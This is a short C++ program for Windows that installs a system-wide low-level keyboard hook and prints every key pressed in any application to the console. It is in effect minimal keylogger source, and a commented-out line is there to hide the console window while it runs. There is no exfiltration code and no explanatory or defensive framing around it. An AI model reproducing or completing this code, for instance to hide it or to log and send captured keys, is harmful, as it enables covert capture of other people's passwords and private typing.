#include <iostream>
#include <windows.h>

using namespace std;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    BOOL fEatKeystroke = FALSE;

    if (nCode == HC_ACTION)
    {
        PKBDLLHOOKSTRUCT press = (PKBDLLHOOKSTRUCT)lParam;
        DWORD vkCode = press->vkCode; // Get the virtual keycode
        if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN)) // Keydown
        {
            cout << (char)vkCode << endl;
        }
    }
    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

int main()
{
    // Hidding console window while executing
    //ShowWindow(GetConsoleWindow(), SW_HIDE);

    // dwThreadId is set to 0 to make all programs to be hooked
    HHOOK hookLowLevelKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL))
    {
        // This while loop keeps the hook
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hookLowLevelKeyboard);

    return 0;
}